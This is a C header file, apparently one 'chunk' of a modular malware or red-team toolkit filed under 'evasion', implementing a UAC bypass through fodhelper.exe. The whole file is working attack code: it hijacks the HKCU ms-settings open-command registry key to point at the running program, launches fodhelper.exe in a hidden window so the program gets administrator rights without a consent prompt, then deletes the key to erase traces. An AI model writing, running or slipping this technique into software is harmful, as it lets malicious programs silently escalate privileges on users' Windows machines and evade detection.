// chunk: evasion/uac_fodhelper
// depends: (none)
// provides: uac_elevate_fodhelper
// headers: windows.h
// risk: medium
// note: UAC bypass via fodhelper.exe — auto-elevates by hijacking
//       HKCU\Software\Classes\ms-settings\Shell\Open\command registry key.
//       fodhelper.exe is an auto-elevate binary that reads this key.

#ifndef CHUNK_UAC_FODHELPER
#define CHUNK_UAC_FODHELPER

#include <windows.h>

static int uac_elevate_fodhelper(void) {
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    HKEY hk;
    LONG r = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) return 0;

    RegSetValueExA(hk, NULL, 0, REG_SZ, (BYTE *)self_path, (DWORD)strlen(self_path) + 1);
    RegSetValueExA(hk, "DelegateExecute", 0, REG_SZ, (BYTE *)"", 1);
    RegCloseKey(hk);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpFile = "C:\\Windows\\System32\\fodhelper.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
    return 1;
}

#endif
